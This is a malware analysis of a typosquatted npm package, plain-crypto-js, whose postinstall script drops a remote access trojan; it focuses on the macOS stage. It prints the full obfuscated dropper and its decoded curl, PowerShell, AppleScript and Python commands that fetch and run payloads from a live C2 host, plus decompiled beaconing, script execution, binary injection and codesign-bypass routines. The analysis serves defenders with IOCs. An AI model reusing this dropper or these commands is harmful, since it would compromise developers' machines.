# AXIOS NPM Supply chain Attack - MacOS RAT

---

## Executive Summary

A sophisticated supply chain attack was identified in the npm package `plain-crypto-js` (a typosquat of `crypto-js`). The campaign targets the **Node.js development ecosystem**, specifically aiming to compromise the local environments of software engineers. The malware utilizes a multi-stage execution flow to deploy a persistent **Remote Access Trojan (RAT)** on Windows, macOS, and Linux hosts.

## Artifacts:

| File Name | SHA256 |
| --- | --- |
| **plain-crypto-js-4.2.1.tgz** | **`58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668`** |
| **setup.js** | **`e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09`** |
| **macOS (/Library/Caches/com.apple.act.mond)** | **`92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a`** |

---

### Package.json

```c
{
  "name": "plain-crypto-js",
  "version": "4.2.1",
  "description": "JavaScript library of crypto standards.",
  "license": "MIT",
  "author": {
    "name": "Evan Vosberg",
    "url": "http://github.com/evanvosberg"
  },
  "homepage": "http://github.com/brix/crypto-js",
  "repository": {
    "type": "git",
    "url": "http://github.com/brix/crypto-js.git"
  },
  "keywords": [
    "security",
    "crypto",
    "Hash",
    "MD5",
    "SHA1",
    "SHA-1",
    "SHA256",
    "SHA-256",
    "RC4",
    "Rabbit",
    "AES",
    "DES",
    "PBKDF2",
    "HMAC",
    "OFB",
    "CFB",
    "CTR",
    "CBC",
    "Base64",
    "Base64url"
  ],
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "postinstall": "node setup.js"
  },
  "dependencies": {},
  "browser": {
    "crypto": false
  }
}
```

## STAGE 1 - Setup.js

---

```c
const _trans_1 = function (x, r) {
      try {
         const E = r.split("").map(Number);
         return x.split("").map(((x, r) => {
            const S = x.charCodeAt(0),
               a = E[7 * r * r % 10];
            return String.fromCharCode(S ^ a ^ 333)
         })).join("")
      } catch {}
   },
   _trans_2 = function (x, r) {
      try {
         let E = x.split("").reverse().join("").replaceAll("_", "="),
            S = Buffer.from(E, "base64").toString("utf8");
         return _trans_1(S, r)
      } catch {}
   },
   stq = ["_kLx+SMqE7KxlS8vE3LxSScqEHKxjScpE7Kx", "__gvELKx", "__gvEvKx", "iWsuF3bx9WctFDbxgSsoE7KxjWspEvKxhSsrE/LxsSsvELaxiW8tF3Lx+ScuEXKx", "", "__wvF7bxkSMpErLx", "jSMpErLx4SMrEnKx", "_oaxtWcrF3axHWMqEnLxhSMrEvIxqWcoF3bxtWcoF/axsSsoF3axvWMqFXIxZSMjE3JxSScmE3JxvW8rFraxhSMqEnKxtW8qFraxvW8rFbIxESMhEHIxSS8nE7IxZS8rF/axtWMqF/axFScmEzIxdSclE7JxdS8rFjaxtWMqEHKxkS8qEfaxtWsvE7LxrScvETLxvScrF3LxvSMoF3axjS8rEnKxpSMpEXKxtWcvEDaxtW8rFjaxUS8nEzIxDSMhEjIxSSsnE3JxoW8rF3axrWcrF/axoWchEnJxMSsmELJxeScnE/axvWsqFPbxtW8rFjaxGS8gETIxBSskEjJxOSsnE/axoWcrF/axvWMvFnLxpSMuEnKxiSMuE3LxiWsqE/LxiSMpFDKx9S8oETax+SMqErKxsSspEnKxsScvE/axoWcrFnKxgWcrFnJxZSsgE3JxtWskEDaxtWsvEDaxtWspE/Lx4SsrEraxuSsoF3axoSctE/KxjWcqEDKxpS8rF3axjSMuE/JxkWcoEHKxoSsoE7JxnS8rELKxtWsqF3axtW8hFPaxvWcoEHKxoScpEnJxjWcuE3LxjS8vE7KxeSsmE/axiWcuE7KxoSMoE/KxCSMqEnLxsS8rE/LxOScrFfbxtWcoEHKxoScpEnJxnS8rELKxqWcuEjKxeScrF3axqWcrFfYx", "_sKxiWcrFjaxFScmEzIxdSskEbIxMSsjELIxGS8rF3axhSMqEnKxqW8qFvaxtWcpErKxiScoELKxjScpFLaxtW8rFLIxZSMjE3JxSScgEvIxOSsgEHIxoWcrFnLx9SMpE/LxpSsvE7Kx", "__wrFLIxZSMjE3JxSScgEvIxOSsgEHIxqW8qE/LxgWcrFDKx4S8rF3ax5SsuETKx/SsrE7LxtWspEHKxoScpEnLxtWsoEnKxtWcrFraxtW8hFTLx4ScuE3axpS8oEjKxqWcrF3axtWsqF3axtWcrFfYxvWspEHKx4S8oEXax7SMqEnKxiWcrFTbxrWcrF/axWS8qF3axvWcrFvaxqWsvE3axrWsqF/axtW8rF3axrWsqFnKxtW8qFraxvW8rFHJxtWsrEfaxtWcpE7LxwSsoFPKxkS8rELaxqW8qFvaxtWMqF3axrWcrFnKxtWMrF3axvWcrFrbx6WsuF3axpSsoEfKxlSsrE3axsW8qF3axvWcrFvaxqWsvE3axrWsqF/axtWsvEDaxtWMqF3axrWcrFjax9WcuE7Kx4ScqEXKx/ScvELaxtS8vELKxjWMoE3LxkS8oF7LxoScrEzKxmSsrEzKx9SsqFnKxgWcrFjaxtW8qF3axsScrFzaxtWcqE3axsWcrF/axtWsoEDaxqWcoE/Lx4ScqE/axtWcuE3LxkSMuE7Kx+ScrFbKxhSMqEXKx+ScrFXKxpScrF3axqWcrF3axtWcrF3axqWcrF3axtWMgFTLx/ScuE3axtWsqF3axtWcrFraxtW8hFDLxvWcqETKxiSMoEPax+SsrEzKxjWMqEHKx6ScvEzKxjW8pELKxuSsoF7LxoSsoE7KxsSsjEXax0S8vEzKx/S8rEPKxBSsoF/axqWcoF/axGS8gETIxGSskE/JxOScmE/axtWcoF/axvWcsE3axiScuEraxwScqE3axhWsvEraxhWMrEbLxqWcuEjKx+ScrF3axqWcrFfYx", "__wqF3ax8W8qFTbx/WcrFHKxmSMuEPKxiW8uEjKxuSsoF3axzWsqF/axFScmEzIxdSclEHIxMSsjEXIxBS8rF3ax5ScvEPKx/SsrE7LxrSsvELKxtWcvEjLxiSsoEPKx", "", "_saxtW8uFvaxzW8vFraxhScoEjLxjSsoFzLxoScqELaxqW8sF3axGS8gETIxGSskE/JxOScmE3ax0ScvEPaxpSspELax9SMoE7LxiWcrF7bxjSsoELKx5SMtE3LxqWcvEjLxlSsoEPKxqW8qFvaxtWcgEPIxEScgELJxfSciE7JxtWsvEfaxtW8vFnLxuSMuE7KxiS8vE3LxlWsqE/LxiS8oFDKx6S8oEPax+S8rErKxsSspE7KxsSsuE3axpSMoFrax0ScvEPaxpScoEXax9SMoEnLxlWcrFLKxgWcrFHKx4SMuE7Kx", "jSsoE7LxgS8oFjKxqSMrEbKxpSMrE3Lx", "_kKxnS8oFjKxqSMrEbKxpSMrE3Lx", "_gKxySMqEPax", "_wbx5ScvEPax", "_4LxoS8uEPax"],
   ord = "OrDeR_7077",
   _entry = function (x) {
      try {
         let r = 4027,
            E = (r.toString().charCodeAt(2), atob("TE9DQUw^".replaceAll("^", "=")) + atob("X1BBVEg^".replaceAll("^", "="))),
            S = atob("UFM_".replaceAll("_", "=")) + atob("X1BBVEg_".replaceAll("_", "=")),
            a = atob("U0NSXw--".replaceAll("-", "=")) + atob("TElOSw))".replaceAll(")", "=")),
            c = atob("UFNfQg--".replaceAll("-", "=")) + atob("SU5BUlk*".replaceAll("*", "=")),
            s = atob("d2hlcmUgcG93ZXJzaGVsbA((".replaceAll("(", "=")),
            t = require(_trans_2(stq[2], ord)),
            W = require(_trans_2(stq[1], ord)),
            {
               execSync: F
            } = require(_trans_2(stq[0], ord)),
            o = W.platform(),
            e = W.tmpdir(),
            q = _trans_2(stq[3], ord) + x,
            n = (_trans_2(stq[4], ord), "");
         W.type(), W.release(), W.arch();
         for (;;) {
            if (o === _trans_2(stq[6], ord)) {
               let r = e + "/" + x,
                  S = _trans_2(stq[9], ord);
               S = S.replaceAll(a, q), S = S.replaceAll(E, r), t.writeFileSync(r, S), n = _trans_2(stq[10], ord), n = n.replaceAll(E, r)
            } else if (o === _trans_2(stq[5], ord)) {
               let r = F(s).toString().trim(),
                  W = process.env.PROGRAMDATA + "\\wt" + _trans_2(stq[15], ord);
               t.existsSync(W) || t.copyFileSync(r, W);
               let o = e + "\\" + x + _trans_2(stq[17], ord),
                  K = e + "\\" + x + _trans_2(stq[16], ord),
                  l = _trans_2(stq[7], ord);
               l = l.replaceAll(a, q), l = l.replaceAll(S, K), l = l.replaceAll(c, W), t.writeFileSync(o, l), n = _trans_2(stq[8], ord), n = n.replaceAll(E, o)
            } else n = _trans_2(stq[12], ord), n = n.replaceAll(a, q);
            break
         }
         F(n);
         const K = __filename;
         t.unlink(K, (x => {})), t.unlink(_trans_2(stq[13], ord), (x => {})), t.rename(_trans_2(stq[14], ord), _trans_2(stq[13], ord), (x => {}))
      } catch {}
   };
_entry("6202033"); // campaign ID passed to entry point
```

This script, you follow the logic of its two transformation functions, `_trans_2` and `_trans_1`, which work together in a layered decoding process.

### **Decoding Layer 1: `_trans_2`**

This function handles the initial formatting of the obfuscated string. It follows three steps:

1. **Reverse:** It reverses the string completely (`.reverse()`).
2. **Restore Base64 Padding:** It replaces underscores (`_`) with equals signs (`=`). This is a common trick to make Base64 look like a normal string.
3. **Base64 Decode:** It converts the resulting string from Base64 into a UTF-8 string, which is then passed to the next layer.

### **Decoding Layer 2: `_trans_1`**

This is the core decryption function that uses a **Positional XOR** algorithm with a static key (`"OrDeR_7077"`).

- **Key Preparation:** It takes the key `"OrDeR_7077"` and converts it into an array of numbers. Since `"O"`, `"r"`, `"D"`, `"e"`, `"R"`, and `"_"` are not numbers, they become `NaN`.
- **The Algorithm:** For every character in the string, it calculates a unique XOR value based on its position (`index`):
    1. It picks a digit from the key array using the formula: `7 * index * index % 10`.
    2. It performs a bitwise XOR: `character ^ chosen_digit ^ 333`.
    - *Note: In JavaScript, bitwise operations treat `NaN` as `0`, so the non-numeric parts of the key effectively XOR with `0`.*

**It is executed automatically via the postinstall script in the malicious plain-crypto-js@4.2.1 package.**

---

### Deobfuscation

---

```python
import base64

stq = ["_kLx+SMqE7KxlS8vE3LxSScqEHKxjScpE7Kx", "__gvELKx", "__gvEvKx", "iWsuF3bx9WctFDbxgSsoE7KxjWspEvKxhSsrE/LxsSsvELaxiW8tF3Lx+ScuEXKx", "", "__wvF7bxkSMpErLx", "jSMpErLx4SMrEnKx", "_oaxtWcrF3axHWMqEnLxhSMrEvIxqWcoF3bxtWcoF/axsSsoF3axvWMqFXIxZSMjE3JxSScmE3JxvW8rFraxhSMqEnKxtW8qFraxvW8rFbIxESMhEHIxSS8nE7IxZS8rF/axtWMqF/axFScmEzIxdSclE7JxdS8rFjaxtWMqEHKxkS8qEfaxtWsvE7LxrScvETLxvScrF3LxvSMoF3axjS8rEnKxpSMpEXKxtWcvEDaxtW8rFjaxUS8nEzIxDSMhEjIxSSsnE3JxoW8rF3axrWcrF/axoWchEnJxMSsmELJxeScnE/axvWsqFPbxtW8rFjaxGS8gETIxBSskEjJxOSsnE/axoWcrF/axvWMvFnLxpSMuEnKxiSMuE3LxiWsqE/LxiSMpFDKx9S8oETax+SMqErKxsSspEnKxsScvE/axoWcrFnKxgWcrFnJxZSsgE3JxtWskEDaxtWsvEDaxtWspE/Lx4SsrEraxuSsoF3axoSctE/KxjWcqEDKxpS8rF3axjSMuE/JxkWcoEHKxoSsoE7JxnS8rELKxtWsqF3axtW8hFPaxvWcoEHKxoScpEnJxjWcuE3LxjS8vE7KxeSsmE/axiWcuE7KxoSMoE/KxCSMqEnLxsS8rE/LxOScrFfbxtWcoEHKxoScpEnJxnS8rELKxqWcuEjKxeScrF3axqWcrFfYx", "_sKxiWcrFjaxFScmEzIxdSskEbIxMSsjELIxGS8rF3axhSMqEnKxqW8qFvaxtWcpErKxiScoELKxjScpFLaxtW8rFLIxZSMjE3JxSScgEvIxOSsgEHIxoWcrFnLx9SMpE/LxpSsvE7Kx", "__wrFLIxZSMjE3JxSScgEvIxOSsgEHIxqW8qE/LxgWcrFDKx4S8rF3ax5SsuETKx/SsrE7LxtWspEHKxoScpEnLxtWsoEnKxtWcrFraxtW8hFTLx4ScuE3axpS8oEjKxqWcrF3axtWsqF3axtWcrFfYxvWspEHKx4S8oEXax7SMqEnKxiWcrFTbxrWcrF/axWS8qF3axvWcrFvaxqWsvE3axrWsqF/axtW8rF3axrWsqFnKxtW8qFraxvW8rFHJxtWsrEfaxtWcpE7LxwSsoFPKxkS8rELaxqW8qFvaxtWMqF3axrWcrFnKxtWMrF3axvWcrFrbx6WsuF3axpSsoEfKxlSsrE3axsW8qF3axvWcrFvaxqWsvE3axrWsqF/axtWsvEDaxtWMqF3axrWcrFjax9WcuE7Kx4ScqEXKx/ScvELaxtS8vELKxjWMoE3LxkS8oF7LxoScrEzKxmSsrEzKx9SsqFnKxgWcrFjaxtW8qF3axsScrFzaxtWcqE3axsWcrF/axtWsoEDaxqWcoE/Lx4ScqE/axtWcuE3LxkSMuE7Kx+ScrFbKxhSMqEXKx+ScrFXKxpScrF3axqWcrF3axtWcrF3axqWcrF3axtWMgFTLx/ScuE3axtWsqF3axtWcrFraxtW8hFDLxvWcqETKxiSMoEPax+SsrEzKxjWMqEHKx6ScvEzKxjW8pELKxuSsoF7LxoSsoE7KxsSsjEXax0S8vEzKx/S8rEPKxBSsoF/axqWcoF/axGS8gETIxGSskE/JxOScmE/axtWcoF/axvWcsE3axiScuEraxwScqE3axhWsvEraxhWMrEbLxqWcuEjKx+ScrF3axqWcrFfYx", "__wqF3ax8W8qFTbx/WcrFHKxmSMuEPKxiW8uEjKxuSsoF3axzWsqF/axFScmEzIxdSclEHIxMSsjEXIxBS8rF3ax5ScvEPKx/SsrE7LxrSsvELKxtWcvEjLxiSsoEPKx", "", "_saxtW8uFvaxzW8vFraxhScoEjLxjSsoFzLxoScqELaxqW8sF3axGS8gETIxGSskE/JxOScmE3ax0ScvEPaxpSspELax9SMoE7LxiWcrF7bxjSsoELKx5SMtE3LxqWcvEjLxlSsoEPKxqW8qFvaxtWcgEPIxEScgELJxfSciE7JxtWsvEfaxtW8vFnLxuSMuE7KxiS8vE3LxlWsqE/LxiS8oFDKx6S8oEPax+S8rErKxsSspE7KxsSsuE3axpSMoFrax0ScvEPaxpScoEXax9SMoEnLxlWcrFLKxgWcrFHKx4SMuE7Kx", "jSsoE7LxgS8oFjKxqSMrEbKxpSMrE3Lx", "_kKxnS8oFjKxqSMrEbKxpSMrE3Lx", "_gKxySMqEPax", "_wbx5ScvEPax", "_4LxoS8uEPax"]

key = [int(c) if c.isdigit() else 0 for c in "OrDeR_7077"]

def decode(s):
    if not s:
        return ""
    try:
        s = s[::-1].replace("_", "=")
        s = base64.b64decode(s + "===")
        s = s.decode("utf-8", errors="ignore")

        out = ""
        for i, ch in enumerate(s):
            k = key[(7 * i * i) % 10]
            out += chr(ord(ch) ^ k ^ 333)
        return out
    except Exception as e:
        return f"[ERROR] {e}"

for i, val in enumerate(stq):
    print(f"{i:02d} => {decode(val)}")
```

![Screenshot 2026-04-02 at 8.40.39 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-02_at_8.40.39_AM.png)

```python
00 => child_process
01 => os
02 => fs
03 => http://sfrclak.com:8000/
04 => 
05 => win32
06 => darwin
07 => 
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""SCR_LINK"" > ""PS_PATH"" & ""PS_BINARY"" -w hidden -ep bypass -file ""PS_PATH"" ""SCR_LINK"" & del ""PS_PATH"" /f", 0, False
    
08 => cscript "LOCAL_PATH" //nologo && del "LOCAL_PATH" /f
09 => 
    set {a, s, d} to {"", "SCR_LINK", "/Library/Caches/com.apple.act.mond"}
        try
            do shell script "curl -o " & d & a & " -d packages.npm.org/product0" & " -s " & s & " && chmod 770 " & d & " && /bin/zsh -c \"" & d & " " & s & " &\" &> /dev/null"
        end try
    do shell script "rm -rf LOCAL_PATH"
10 => nohup osascript "LOCAL_PATH" > /dev/null 2>&1 &
11 => 
12 => curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &
13 => package.json
14 => package.md
15 => .exe
16 => .ps1
17 => .vbs
```

---

Based on the deobfuscation of the `setup.js` array, the following components were identified:

| **Index** | **Identifier** | **Description** |
| --- | --- | --- |
| **00-02** | **Modules** | Utilizes `child_process`, `os`, and `fs` for system-level interaction. |
| **03** | **C2 URL** | Primary Command & Control: `http://sfrclak.com:8000/` |
| **05-06, 12** | **Targets** | Targets `win32` (Windows), `darwin` (macOS) specifically and Linux |
| **15-17,  12** | **Extensions** | Handles `.exe`, `.ps1`, **`.py`** and `.vbs` payloads. |

### Execution Flow by OS

#### **A. Windows Execution (Indices 07, 08)**

- **Stealth Copy**: Copies `powershell.exe` to `%PROGRAMDATA%\wt.exe` to evade detection from security tools monitoring standard PowerShell usage.
- **Persistence**: Creates a VBScript (`.vbs`) and a PowerShell script (`.ps1`) in the `%TEMP%` directory.
- **Payload**: The VBScript executes the PowerShell script using the hidden copy (`wt.exe`).
- **Command**: `curl -s -X POST -d "packages.npm.org/product1" "http://sfrclak.com:8000/6202033" > "PS_PATH"`

#### **B. macOS Execution (Index 09, 10)**

- **Persistence**: Writes an AppleScript to a temporary location.
- **Payload**: Downloads a second-stage binary to `/Library/Caches/com.apple.act.mond`, makes it executable (`chmod 770`), and runs it via `/bin/zsh`.
- **Command**: `curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s http://sfrclak.com:8000/6202033`

#### **C. Linux / Unix**

- **Payload**: Directly uses `curl` to download a Python script `/tmp/ld.py` and executes it in the background using `nohup`.
- **Command**: `curl -o /tmp/ld.py -d packages.npm.org/product2 -s http://sfrclak.com:8000/6202033 && nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033`

---

### **Indicators of Compromise (IOCs)**

### **Network Indicators**

- **Domain:** `sfrclak.com`
- **Port:** `8000`
- **Callback URI:** `http://sfrclak.com:8000/`
- **Exfiltration String:** `packages.npm.org/product[0-2]`

### **Host Indicators**

- **Files Created:** * `/Library/Caches/com.apple.act.mond` (macOS)
    - `/tmp/ld.py` (Linux/Unix)
- **Processes:** * `powershell.exe -w hidden -ep bypass`
    - `osascript` executing shell scripts.

### Clean up & Antiforensics

The script performs the following final steps to hide its presence:

1. **Self-Deletion**: The script deletes itself (`setup.js`) using `fs.unlink`.
2. **Metadata Tampering**: Deletes the original `package.json` and renames a decoy `package.md` to `package.json`. This is likely done to hide the malicious `postinstall` script or other dependencies that were present during the initial infection.

### Description

The malware is a sophisticated **Supply Chain Attack** vector. By hiding in the `setup.js` , it ensures that the moment a developer installs the package, the system is compromised before any code is even written.

This sample is a classic example of a cross-platform dropper. It shows significant effort in targeting different operating systems with platform-specific scripts (VBScript, AppleScript, Shell) and employs binary masquerading and cleanup techniques to maintain a low profile.

---

## macOS Stage-2 RAT

---

### File Header

| **Property** | **Value** |
| --- | --- |
| **SHA-256** | `506690fcbd10fbe6f2b85b49a1fffa9d984c376c25ef6b73f764f670e932cab4` |
| **Magic Header** | `0xfeedfacf` (Mach-O 64-bit) |
| **Required Arch** | `x86_64` (Intel 64-bit) |
| **Entry Point** | `0x7a60` |
| **Load Commands** | 19 (Total Size: 1808 bytes) |
| **Flags** | `PIE`, `DYLDLINK`, `BINDS_TO_WEAK`, `NOUNDEFS`, `TWOLEVEL` |

### Memory Segments

| **Name** | **Virtual Address** | **Virtual Size** | **Offset** | **Raw Size** |
| --- | --- | --- | --- | --- |
| `__PAGEZERO` | `0x0` | `0x100000000` | `0x0` | `0x0` |
| `__TEXT` | `0x100000000` | `0x1e000` | `0x0` | `0x1e000` |
| `__DATA_CONST` | `0x10001e000` | `0x1000` | `0x1e000` | `0x1000` |
| `__DATA` | `0x10001f000` | `0x1000` | `0x1f000` | `0x1000` |
| `__LINKEDIT` | `0x100020000` | `0x2c000` | `0x20000` | `0x29400` |

### Behavioral Indicators (Dynamic Linking)

| **Linked Library** | **Likely Functionality** |
| --- | --- |
| `/usr/lib/libcurl.4.dylib` | **C2 Communication:** Used for transferring data via HTTP/HTTPS. This is the primary engine for exfiltration. |
| `/usr/lib/libc++.1.dylib` | **Logic:** Indicates the malware was written in C++ rather than plain C. |
| `/usr/lib/libSystem.B.dylib` | **System Access:** Provides access to low-level syscalls (files, network, processes). |

### Main Execution Flow (main() function)

The entry point of the macOS RAT is a C++ main() function that implements a classic beaconing implant with initial registration followed by periodic heartbeats.

### Decompiled Main Function

```python
int __fastcall main(int argc, const char **argv, const char **envp)
{
    if (argc > 1) {
        char *c2_url = (char *)argv[1];                    // C2 passed by dropper

        GenerateUID((char *)&uid, 16);                     // 16-char random session ID
        GetOS(( __int64)os_info);
        InitDirInfo(dir_info);

        // Build FirstInfo JSON
        nlohmann::json first_info;
        first_info["type"] = "FirstInfo";
        first_info["uid"]  = uid;
        first_info["content"] = dir_info;
        first_info["os"]   = os_string;

        Report(c2_url, first_info.dump().c_str(), ...);    // Initial beacon

        // Infinite beacon loop (60 seconds)
        while (true) {
            // Collect rich system fingerprint
            GetHostname(...);
            GetUsername(...);
            GetProcessList(process_list, 1000);
            GetOSVersion(...);
            GetTimezone(...);
            GetModel(...);
            GetCPUType(...);
            GetBootTime(...);
            FormatTime(current_time);

            // Build BaseInfo JSON
            nlohmann::json base_info;
            base_info["type"] = "BaseInfo";
            base_info["uid"]  = uid;
            base_info["data"] = collected_data;   // hostname, username, processes, etc.

            std::string response;
            if (Report(c2_url, base_info.dump().c_str(), &response)) {
                DoWork(uid, c2_url, response);    // Process C2 commands
            }

            sleep(60);
        }
    }
    return 0;
}
```

| Phase | Function / Code Block | Description | Key Details / Artifacts |
| --- | --- | --- | --- |
| **Entry Point Check** | `if (argc > 1)` | Validates that C2 URL is passed as first argument | C2 URL received from dropper (AppleScript/zsh) |
| **Session Initialization** | `GenerateUID()` | Generates unique session identifier | 16-character random alphanumeric UID |
| **Initial Beacon** | `FirstInfo` JSON construction | Sends initial registration and directory snapshot | Type: `"FirstInfo"`
Contains: UID, OS info, `InitDirInfo()` |
| **System Recon** | `GetOS()`, `GetOSVersion()`, `GetHostname()`, `GetUsername()`, `GetProcessList()`, `GetModel()`, `GetCPUType()`, `GetTimezone()`, `GetBootTime()`, `GetInstallTime()`, `FormatTime()` | Collects detailed host fingerprint in every loop iteration | Hostname, username, full process list (up to 1000), hardware model, CPU type, timestamps |
| **Heartbeat Loop** | `while (true)` + `sleep(0x3Cu)` | Infinite beaconing loop | Executes every **60 seconds** |
| **Beacon Message** | `BaseInfo` JSON construction | Periodic status update sent to C2 | Type: `"BaseInfo"`
Contains rich system + process data |
| **C2 Communication** | `Report()` | Sends JSON data to C2 via HTTP POST | Uses libcurl
Spoofed IE8 User-Agent
Likely Base64 encoding |
| **Command Processing** | `DoWork(uid, c2_url, response)` | Handles server response and executes remote commands | Called only when C2 returns data |
| **Supported Commands** (in DoWork) | `peinject`, `runscript`, `rundir`, `kill` | Remote control capabilities | Binary execution with ad-hoc codesign, shell/AppleScript, directory listing, self-kill |
| **JSON Library** | `nlohmann::json` (heavy usage) | Used for building and parsing all messages | `FirstInfo`, `BaseInfo`, command responses |

### Description

The **`main()`** function implements a classic persistent RAT pattern:

- **FirstInfo** beacon for initial registration and directory enumeration.
- **BaseInfo** heartbeat **`every 60 seconds`** containing comprehensive system reconnaissance.
- Command execution is delegated to **`DoWork()`**, making the implant extensible for **file operations, process injection (peinject), script execution, and self-removal.**

This design, combined with the use of nlohmann::json and libcurl, shows a well-structured C++ implant consistent with **`WAVESHAPER.V2`** tooling attributed to **`UNC1069 (North Korea-nexus actor).`**

---

### C2 Communication  `Report()` Function

The **`Report()`** function is the core network component responsible for all outbound communication with the C2 server. It handles **`JSON message encoding`**, **`Base64 encoding`**, and **`HTTP POST requests`**.

This is the main C2 communication function. It takes a JSON payload, Base64-encodes it, sends it to the attacker’s server via HTTP POST using libcurl, and stores any response from the server.

![Screenshot 2026-04-04 at 8.22.29 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.22.29_AM.png)

- **Initial Validation**
    
    ```cpp
    if ( a1 && a2 && *a1 && *a2 )
    ```
    
    - Checks if C2 URL (a1) and JSON data (a2) are valid and non-empty.
    - If any check fails, the function immediately returns -1 (failure).

![Screenshot 2026-04-04 at 8.24.11 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.24.11_AM.png)

**Clear Response Buffer**

```cpp
if ( (*(_BYTE *)a3 & 1) != 0 ) { ... } else { *(_WORD *)a3 = 0; }
```

- Clears the output buffer (a3) that will store the server’s response.
- This prepares the buffer for new data from the C2.

**Convert JSON to std::string**

```cpp
std::string::basic_string[abi:ne200100]<0>(&v10, a2);
v5 = (char *)&v10 + 1;
```

- Copies the input JSON data into a std::string object.

![Screenshot 2026-04-04 at 8.25.39 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.25.39_AM.png)

**Base64 Encoding**

```python
Base64Encode((std::string *)v12);
```

- Calls a custom Base64Encode() function on the JSON string.
- The encoded result is stored in v12.
- This is an extra layer of obfuscation — the C2 receives Base64 data instead of raw JSON.

**libcurl Initialization**

```cpp
v6 = curl_easy_init();
v7 = v6;
```

- Initializes a new libcurl session.

**Configure curl Options**

![Screenshot 2026-04-04 at 8.28.41 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.28.41_AM.png)

```cpp
curl_easy_setopt(v7, CURLOPT_URL, a1);                    // Set C2 URL
curl_easy_setopt(v7, CURLOPT_POST, 1);                    // Use POST method
curl_easy_setopt(v7, CURLOPT_COPYPOSTFIELDS, v5);         // Send Base64-encoded data
curl_easy_setopt(v7, CURLOPT_USERAGENT, "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)");  // Spoof IE8
curl_easy_setopt(v7, CURLOPT_WRITEFUNCTION, WriteCallback);   // Callback for response
curl_easy_setopt(v7, CURLOPT_WRITEDATA, a3);              // Store response here
curl_easy_setopt(v7, CURLOPT_CONNECTTIMEOUT, 30);         // 30 second timeout
curl_easy_setopt(v7, CURLOPT_FOLLOWLOCATION, 1);
```

**IOC**: The User-Agent is spoofed as an old Windows IE8 browser. This is used consistently across all platforms in this RAT family.

**Execute the Request**

```cpp
if ( curl_easy_perform(v7) )
```

- Sends the actual HTTP POST request.
- If it fails → clear response buffer and return -1.
- If successful → return 0.

**Cleanup**

- Uses a CurlGuard RAII object to automatically clean up the curl handle.
- Manually deletes temporary buffers used for Base64 encoding.

---

### Function: **`DoWork()` Remote Action Handlers**

The `DoWork` function acts as the RAT's command center, parsing JSON responses from the C2 server and dispatching them to four primary modules:

| Command | JSON "type" value | What it does | Typical Response |
| --- | --- | --- | --- |
| **kill** | `"kill"` | Terminates the RAT gracefully (self-kill switch) | `{"type": "CmdResult", "cmd": "rsp_kill", ...}` |
| **peinject** | `"peinject"` | Receives Base64 binary → writes to temp file → ad-hoc codesigns → executes | `rsp_peinject` |
| **runscript** | `"runscript"` | Executes shell command or AppleScript (via osascript) | `rsp_runscript` |
| **rundir** | `"rundir"` | Directory enumeration (lists files in requested paths) | `rsp_rundir` |

![Screenshot 2026-04-04 at 8.46.18 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.46.18_AM.png)

![Screenshot 2026-04-04 at 8.46.43 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.46.43_AM.png)

- **Process:** It receives a Base64-encoded binary (`IjtBin`) and optional parameters.
- **Secrecy:** Writes the binary to a hidden path in `/private/tmp/.<random_name>`.
- **Security Bypass:** It executes `codesign --force --deep --sign - "<path>"` against the new file. This allows the malicious binary to run without triggering "Unverified Developer" warnings on macOS.
- The RAT uses **`nlohmann::json`** heavily for clean, structured C2 communication.
- Commands are sent as simple **`JSON objects (e.g., {"type": "kill"} or {"type": "peinject", "data": "<base64>"}).`**

---

### Function **`DoActionScpt()`**

DoActionScpt() handles the runscript command (when the C2 sends "type": "runscript").

- **Receive** B**`ase64-encoded`** AppleScript from C2 (in the runscript command).
- **Decode** the Base64 data.
- If valid:
    - Save it to a **`temporary file`** in /tmp/ (random name via CreateTempScptFile).
    - Build command line: **`/usr/bin/osascript`** <temp_file> [optional args].
    - Execute it using **`RunProcess().`**
    - **Delete** the temporary .**`scpt`** file immediately (unlink).
- If empty/invalid:
    - Return an error JSON: {"status": "**`Zzz`**", "**`msg`**": "**`empty scpt`**"}.

![Screenshot 2026-04-04 at 8.58.38 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_8.58.38_AM.png)

---

### Function `DoActionDir()`

- **`Initialize`** an empty **`JSON array as the result ([])`**.
- **`Iterate`** over every object in the input J**`SON array (a2)`**.
- For each object, extract two fields:
    - "**`path`**" → directory path to enumerate
    - "**`id`**" → identifier (probably to match request with response)
- Call **`GetDetailedFileList()`** — the core function that:
    - Reads the directory at the given path
    - Collects detailed file information **`(name, size, type, permissions, timestamps, etc.)`**
    - Returns the result as a **`JSON object/array`**
- **Push** the result into the output array.
- After processing all requested paths, return the complete array to be sent back to the C2 via Report().

---

### Command Format

The C2 likely sends something like this

```json
{
  "type": "rundir",
  "data": [
    { "path": "/Users/victim/Documents", "id": "doc1" },
    { "path": "/Applications", "id": "app1" },
    { "path": "~/Desktop", "id": "desk1" }
  ]
}
```

And the RAT replies with

```json
[
  { "id": "doc1", "files": [ {name, size, type, ...}, ... ] },
  { "id": "app1", "files": [ ... ] },
  ...
]
```

### Key Observations
